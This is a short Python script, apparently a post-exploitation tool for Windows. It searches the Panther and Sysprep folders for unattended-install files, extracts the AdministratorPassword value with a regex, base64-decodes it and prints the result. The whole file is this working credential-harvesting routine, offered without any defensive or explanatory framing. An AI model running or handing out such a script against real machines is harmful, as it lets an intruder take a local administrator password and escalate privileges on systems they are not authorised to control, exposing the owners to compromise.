import os
import re
import base64

def find_unattended_files():
    search_paths = [
        os.environ.get("SystemRoot", "C:\\Windows") + "\\Panther",
        os.environ.get("SystemRoot", "C:\\Windows") + "\\Panther\\Unattend",
        os.environ.get("SystemRoot", "C:\\Windows") + "\\System32\\Sysprep"
    ]
    target_files = ["unattend.xml", "autounattend.xml", "sysprep.inf"]
    found_files = []
    for path in search_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.lower() in target_files:
                        found_files.append(os.path.join(root, file))
    return found_files

def extract_credentials(file_path):
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        password_pattern = r"<AdministratorPassword>.*?<Value>(.*?)</Value>.*?</AdministratorPassword>"
        match = re.search(password_pattern, content, re.DOTALL | re.IGNORECASE)
        if match:
            return match.group(1).strip()
    except Exception:
        pass
    return None

def decode_password(raw_value):
    try:
        decoded_bytes = base64.b64decode(raw_value, validate=True)
        return decoded_bytes.decode("utf-8", errors="ignore")
    except Exception:
        return raw_value

def main():
    files_to_check = find_unattended_files()
    if not files_to_check:
        return
    admin_password = None
    for file_path in files_to_check:
        raw_pwd = extract_credentials(file_path)
        if raw_pwd:
            admin_password = decode_password(raw_pwd)
            break
    if admin_password:
        print(f"Password: {admin_password}")

if __name__ == "__main__":
    main()
